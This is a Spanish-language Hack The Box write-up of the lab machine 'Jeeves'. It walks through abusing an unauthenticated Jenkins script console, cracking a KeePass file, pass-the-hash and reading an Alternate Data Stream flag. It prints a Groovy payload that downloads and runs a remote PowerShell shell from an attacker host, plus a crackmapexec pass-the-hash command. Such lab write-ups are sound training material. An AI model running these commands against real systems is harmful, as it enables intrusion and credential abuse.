---
title: "Mission: Jeeves"
excerpt: "Jeeves presenta una instancia de Jenkins sin autenticación. Abusamos de la consola de scripts para RCE, extraemos una base de datos KeePass y ejecutamos Pass-The-Hash. El flag final se oculta en un Alternate Data Stream (ADS)."
date: 2020-12-13
author: "Esteban Jimenez"
difficulty: "Medium"
platform: "Hack The Box"
status: "PWNED"
header:
  teaser: /images/htb-jeeves/jeeves.png
  teaser_home_page: true
categories:
  - HackTheBox
  - Windows
tags:
  - Jenkins
  - Pass-The-Hash
  - KeePass
  - ADS
  - Windows
---

## 🎯 Mission Briefing

**Objetivo**: Comprometer el servidor Windows "Jeeves", explotando servicios mal configurados (Jenkins) y técnicas de post-explotación en entornos Windows.

---

## 🕵️ Phase 1: Intelligence Gathering

El escaneo revela puertos estándar de Windows (80, 135, 445) y un puerto inusual: **50000**.
Mediante fuzzing de directorios en el puerto 50000, descubrimos `/askjeeves`, que expone una instancia de **Jenkins** sin autenticación.

---

## ⚔️ Phase 2: Infiltration (Jenkins RCE)

Jenkins permite la ejecución de scripts en **Groovy** a través de su consola de administración (`/script`). Aprovechamos esto para ejecutar comandos del sistema.

**Payload Groovy**:
```groovy
println "cmd.exe /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.x/shell.ps1')".execute().text
```

Esto nos otorga acceso inicial como el usuario `kohsuke`.

---

## 🚀 Phase 3: Privilege Escalation

Enumerando los archivos del usuario, encontramos `CEH.kdbx`, una base de datos de contraseñas **KeePass**.
1.  **Extracción**: Descargamos el archivo a nuestra máquina.
2.  **Cracking**: Utilizamos `keepass2john` y `hashcat` para recuperar la contraseña maestra: `moonshine1`.
3.  **Credenciales**: Dentro de la base de datos, encontramos un hash NTLM de administrador.

**Pass-The-Hash**:
Utilizamos el hash recuperado para autenticarnos directamente sin conocer la contraseña en texto plano.
```bash
crackmapexec smb 10.10.10.63 -u Administrator -H aad3b...:e0fb...
```
El ataque es exitoso (`Pwn3d!`), permitiéndonos obtener una shell de sistema (`NT AUTHORITY\SYSTEM`).

---

## 🚩 Flag de Root (ADS)

Al navegar al escritorio del Administrador (`C:\Users\Administrator\Desktop`), el archivo `root.txt` no es visible.
Esto se debe al uso de **Alternate Data Streams (ADS)**.

**Recuperación**:
```powershell
C:\Users\Administrator\Desktop> dir /R
...
34 hm.txt:root.txt:$DATA
...
```

Leemos el stream oculto para completar la misión:
```powershell
more < hm.txt:root.txt
```

**Estado de la Misión**: `COMPLETADA`
